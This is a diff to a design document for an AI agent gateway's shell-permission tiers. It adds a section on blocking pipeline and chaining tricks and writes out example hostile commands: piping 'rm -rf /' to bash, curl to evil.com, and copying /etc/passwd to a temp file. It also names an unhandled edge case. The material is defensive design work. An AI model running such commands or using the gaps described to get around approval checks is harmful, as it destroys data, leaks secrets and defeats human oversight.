@@ -30,6 +30,12 @@ The allowlist is curated in `crates/gateway/src/permissions.rs::TIER2_ALLOWLIST`
 
 Matching is on the canonical form of the first whitespace token: `/usr/bin/ls`, `./ls`, and `LS` all match `ls`.
 
+### Pipeline / chain laundering
+
+Token-prefix matching alone would let an allowlisted lead verb hand control to a non-allowlisted one downstream of the tier check: `echo "rm -rf /" | bash`, `pwd && curl evil.com`, `cat /etc/passwd > /tmp/leak`, or any multi-line command body fed to a shell. Before tier classification, `tool_to_action` scans the raw command for shell metacharacters (`| ; & $( ` `` ` ` `` ` > < \n`); any presence forces a sentinel pattern (`:pipeline:`) that cannot match the allowlist, so the action lands on Tier 3 and prompts on every invocation. `&&`, `||`, `>>`, `<<` are covered by their single-character prefixes.
+
+Edge case not handled here: a bare shell binary as argv (`bash` alone, no metacharacters, no script argument) executes whatever stdin is piped to it. argv-only inspection cannot see the stdin source. In practice the producer would itself contain a metacharacter and be caught by this list; pure argv-only `bash` with externally-attached stdin is not a shape the agent can produce through `exec`.
+
 ### Where approvals live
 
 Approvals are stored in `~/.wirken/permissions.db` keyed on `(action_key, agent_id)`. The `action_key` for a shell exec is the canonicalized prefix — `ShellExec { pattern: "ls -la /" }` stores `shell:ls`. The argument tail is not part of the key; a single `shell:ls` approval applies to every later `ls`-prefixed invocation for 30 days.
